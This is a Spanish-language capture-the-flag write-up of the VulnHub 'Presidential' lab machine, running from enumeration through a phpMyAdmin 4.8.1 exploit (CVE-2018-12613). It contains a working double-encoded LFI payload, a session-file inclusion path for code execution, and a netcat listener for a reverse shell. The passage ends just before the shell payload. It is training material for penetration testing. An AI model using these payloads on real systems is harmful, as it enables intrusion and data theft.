---
description: >-
  Writeup de la máquina de dificultad media Presidential de la página https://vulnhub.com
title: VulnHub - Presidential | (Difficulty Medium) - Linux
date: 2025-02-07
categories: [Writeup, VulnHub]
tags: [vulnhub, hacking, linux, medium, lfi, rce, phpmyadmin, capabilities, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/bb94b984-cc01-4945-a8ba-7b5bd73cae7c
---

## Useful Skills

* Web Enumeration
* Information Lekeage (config.php.bak)
* Subdomain Enumeration
* phpMyAdmin Local File Inclusion
* Internal Port Discovery through LFI (/proc/net/tcp)
* Abusing phpMyAdmin 4.8.1 LFI to RCE via id_session (CVE-2018-12613)

## Enumeration

### TCP Scan

 ```bash
rustscan -a 192.168.2.142 --ulimit 5000 -g
192.168.2.142 -> [80,2082]
```

```bash
nmap -p80,2082 -sCV 192.168.2.142 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 21:59 CET
Nmap scan report for votenow.local (192.168.2.142)
Host is up (0.00034s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ontario Election Services &raquo; Vote Now!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
MAC Address: 00:0C:29:CE:40:3D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 192.168.2.142 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 22:01 CET
Nmap scan report for 192.168.2.142
Host is up (0.00025s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
19663/udp closed unknown
22852/udp closed unknown
23108/udp closed unknown
30093/udp closed unknown
45928/udp closed unknown
51690/udp closed unknown
MAC Address: 00:0C:29:CE:40:3D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.88 second
```

### HTTP Enumeration

Whatweb reporta que se está empleando el lenguaje de programación PHP con una versión desactualizada, la cual es 5.5.38 y un servidor apache 2.2.46

```bash
whatweb http://192.168.2.142
http://192.168.2.142 [200 OK] Apache[2.4.6], Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@votenow.loca], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.5.38], IP[192.168.2.142], JQuery, PHP[5.5.38], Script, Title[Ontario Election Services &raquo; Vote Now!]
```

> Hay que añadir el dominio votenow.local en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 192.168.2.142
{: .prompt-tip }

Accediendo a la página en http://votenow.local/ puedo observar una página para el voto de elecciones presidenciales

![imagen](https://github.com/user-attachments/assets/86e7f33d-3cd1-4a00-85de-686014e1ff34)

La página es una landin page, y no tiene mucho contenido ni enlaces a otros sitios, por ello utilizaré gobuster para realizar una búsqueda de directorios y archivo PHP

```bash
gobuster dir -u http://votenow.local -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 --add-slash -x php,php.bak -q
/.hta.php.bak/        (Status: 403) [Size: 215]
/.htaccess.php/       (Status: 403) [Size: 216]
/.htaccess.php.bak/   (Status: 403) [Size: 220]
/.htaccess/           (Status: 403) [Size: 212]
/.hta/                (Status: 403) [Size: 207]
/.htpasswd.php/       (Status: 403) [Size: 216]
/.hta.php/            (Status: 403) [Size: 211]
/.htpasswd.php.bak/   (Status: 403) [Size: 220]
/.htpasswd/           (Status: 403) [Size: 212]
/assets/              (Status: 200) [Size: 1505]
/cgi-bin//            (Status: 403) [Size: 210]
/cgi-bin/             (Status: 403) [Size: 210]
/config.php/          (Status: 200) [Size: 0]
/icons/               (Status: 200) [Size: 74409]
```

Observo dos archivo que llaman mi atención, uno es config.php y el otro es el backup config.php.bak, accedo a config.php y no soy capaz de ver nada, pero al acceder a config.php.bak consigo observar en el código fuente unas credenciales de acceso a la base de datos, pero el servicio no se encuentra expuesto.

![imagen](https://github.com/user-attachments/assets/3a5119c7-5f85-4f93-af9b-2164dd1c785d)

Intento acceder por ssh como el usuario votebox, pero necesito la clave privada para realizar la autenticación, por lo que no es posible.

```bash
ssh votebox@votenow.local -p2082
The authenticity of host '[votenow.local]:2082 ([192.168.2.142]:2082)' can't be established.
ED25519 key fingerprint is SHA256:d+Zod13cfhVNilw/xRRCqquMQdOhDdQ1RVwTzx0mUdo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[votenow.local]:2082' (ED25519) to the list of known hosts.
votebox@votenow.local: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

Utilizo ffuf para realizar enumeracion de subdominios, consigo encontrar un subdominio, el cual es datasafe.votenow.local

```bash
ffuf -c -t 100 -fl 283 -fc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://votenow.local -H "Host: FUZZ.votenow.local"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://votenow.local
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.votenow.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 283
 :: Filter           : Response status: 404
________________________________________________

datasafe                [Status: 200, Size: 9508, Words: 439, Lines: 69, Duration: 2440ms]
```

> Hay que añadir el dominio datasafe.votenow.local en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 192.168.2.142
{: .prompt-tip }

Accedo a http://datasafe.votenow.local/ puedo observar una de acceso a phpMyAdmin

![imagen](https://github.com/user-attachments/assets/36b7623e-842c-4cfa-be3b-bb72bcefefee)

Utilizo las credenciales obtenenidas en config.php.bak, usuario votebox y contraseña casoj3FFASPsbyoRP para acceder a phpMyAdmin

![imagen](https://github.com/user-attachments/assets/073a0b93-9ce7-462a-9e0f-8cbf04377503)

![imagen](https://github.com/user-attachments/assets/50adfadf-fe56-41d7-ab51-d4675c83cb2a)

Observo una base de datos llamada users, donde consigo ver un usuario y una contraseña hasheada en lo que parece ser bcrypt, intento crackearla pero no es posible

![imagen](https://github.com/user-attachments/assets/ea546b7d-4fe9-4e1f-a2f5-e273dec9f9f7)

Consigo ver que se está utilizando la versión 4.8.1 en phpMyAdmin

![imagen](https://github.com/user-attachments/assets/298383c2-43ee-40cd-99a4-d12a581e1e55)

> Sabiendo que es phpMyAdmin y que la versión es 4.8.1 puedo buscar información sobre posibles vulnerabilidades existentes
{: .prompt-info }

## Vulnerability analysis

### CVE-2018-12613 (phpMyAdmin 4.8.1 RCE)

Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2018-12613, esta vulnerabilidad permite a un atacante autenticado a través de un LFI ejecutar código PHP arbitrario en el servidor.

* [NVD Explanation CVE-2018-12613](https://nvd.nist.gov/vuln/detail/CVE-2018-12613)

## Explitation

### Abusing phpMyAdmin 4.8.1 LFI to RCE Vulnerability (CVE-2018-12613)

Encuentro en exploit-db los pasos a seguir para explotar la vulnerabilidad CVE-2018-12613 lo cual me sirven de guía para entender como funciona todo.

* [phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion](https://www.exploit-db.com/exploits/44924)

![imagen](https://github.com/user-attachments/assets/d34079ab-96fc-4cf2-8616-38125daf58c7)

* [phpMyAdmin 4.8.1 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/50457)

![imagen](https://github.com/user-attachments/assets/71384abf-f93f-4102-b608-bc42fc977b01)

El LFI reside en index.php, ya que según explican en la línea 61 contiene un include con un $_REQUEST['target'];, el código contiene varias medidas de seguridad para prevenir LFI, pero se proporciona un payload urlencodeado dos veces con %253f para evitar la validación. Quedaría algo así:

```
http://192.168.2.142/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd
```

Utilizando el payload porporcionado consigo visualizar el fichero de configuracion passwd del máquina victima

![imagen](https://github.com/user-attachments/assets/784d64fb-f195-48e3-aaf2-b6dfdb6ec524)

Una vez acontecido el LFI enumero puertos internos de la máquina a través de /proc/net/tcp para detectar aquellos que no he podido en el escaneo de nmap ya que no se encuentran expuestos.

![imagen](https://github.com/user-attachments/assets/72d141e8-f7c7-4664-ae52-66813206885d)

```bash
cat ports | awk '{print $2}' | grep -v local_address | cut -d : -f 2 | sort -u | while read port;do echo "Port -> $((0x$port))";done
Port -> 80
Port -> 2082
Port -> 3306
Port -> 59060
```

Para migrar el LFI a un RCE intento apuntar a /var/log/apache2/access.log y /var/log/auth.log, pero no tengo capacidad de lectura, por lo que no puedo envenenar los logs de Apache ni SSH, me centro en seguir los pasos del exploit, basicamente en el apartado de consultas SQL podemos incrustar código PHP, este de primeras no será interpretado, pero el problema resida en que en la sesion se almacena todo lo que ejecutamos, por ello a través del LFI es posible apuntar a la sesión y ejecutar el código PHP, la ruta a apuntar es la siguiente:

```
/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_
```

Inicio un listener con netcat para entablar la reverse shell por el puerto 4444

```bash
 nc -lvnp 4444
listening on [any] 4444 ...
```

Me dirijo a http://datasafe.votenow.local/ y en el apartado de consultas SQL incluyo una consulta SQL con código PHP que ejecuta un reverse shell hacia mi máquina atacante

